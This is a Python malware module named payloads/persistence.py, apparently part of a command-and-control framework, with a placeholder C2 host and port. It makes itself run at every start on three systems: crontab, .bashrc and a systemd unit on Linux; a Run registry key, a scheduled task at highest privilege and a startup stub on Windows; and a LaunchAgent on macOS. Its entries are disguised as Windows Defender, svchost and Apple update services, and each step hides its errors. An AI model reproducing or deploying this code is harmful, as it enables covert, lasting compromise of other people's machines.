#!/usr/bin/env python3
"""
payloads/persistence.py — persistance multi-plateforme
Linux : crontab + ~/.bashrc + systemd user unit
Windows : HKCU Run + schtasks + Startup folder
macOS : LaunchAgent plist
Variables injectées : FILL_C2_HOST, FILL_PORT
"""
import os, sys, platform, pathlib, subprocess

C2   = "http://FILL_C2_HOST:FILL_PORT"
SELF = os.path.abspath(__file__)
PY   = "python3" if platform.system() != "Windows" else "pythonw"
CMD  = f"{PY} {SELF}"

plat = platform.system()

if plat == "Linux":
    # 1. crontab
    subprocess.run(
        f'(crontab -l 2>/dev/null; echo "@reboot {CMD}") | crontab -',
        shell=True, capture_output=True,
    )
    # 2. ~/.bashrc
    bashrc = pathlib.Path.home() / ".bashrc"
    marker = f"# fl_persist_{os.path.basename(SELF)}"
    try:
        content = bashrc.read_text(errors="ignore")
        if marker not in content:
            with open(bashrc, "a") as f:
                f.write(f"\n{marker}\n({CMD} &)\n")
    except Exception:
        pass
    # 3. systemd user unit
    try:
        unit_dir = pathlib.Path.home() / ".config/systemd/user"
        unit_dir.mkdir(parents=True, exist_ok=True)
        unit = unit_dir / "fl-update.service"
        unit.write_text(f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart={CMD}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
""")
        subprocess.run(
            "systemctl --user enable fl-update.service 2>/dev/null",
            shell=True, capture_output=True,
        )
    except Exception:
        pass

elif plat == "Windows":
    # 1. HKCU Run registry
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "WindowsDefenderHelper", 0,
                          winreg.REG_SZ, f"pythonw {SELF}")
        winreg.CloseKey(key)
    except Exception:
        pass
    # 2. Scheduled task
    try:
        subprocess.run(
            f'schtasks /create /sc onlogon /tn "WindowsDefenderSvc" '
            f'/tr "pythonw {SELF}" /f /rl highest',
            shell=True, capture_output=True,
        )
    except Exception:
        pass
    # 3. Startup folder
    try:
        startup = pathlib.Path(os.environ.get("APPDATA","")) / \
                  "Microsoft/Windows/Start Menu/Programs/Startup"
        if startup.exists():
            stub = startup / "svchost_fl.pyw"
            stub.write_text(
                "import subprocess,sys\n"
                f"subprocess.Popen(['pythonw',r'{SELF}'],"
                "creationflags=0x08000000)\n"
            )
    except Exception:
        pass

elif plat == "Darwin":
    try:
        la = pathlib.Path.home() / \
             "Library/LaunchAgents/com.apple.sysupdate.helper.plist"
        la.write_text(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key>
  <string>com.apple.sysupdate.helper</string>
  <key>ProgramArguments</key>
  <array>
    <string>python3</string>
    <string>{SELF}</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>ThrottleInterval</key><integer>30</integer>
</dict></plist>""")
        subprocess.run(
            f"launchctl load {la}", shell=True, capture_output=True,
        )
    except Exception:
        pass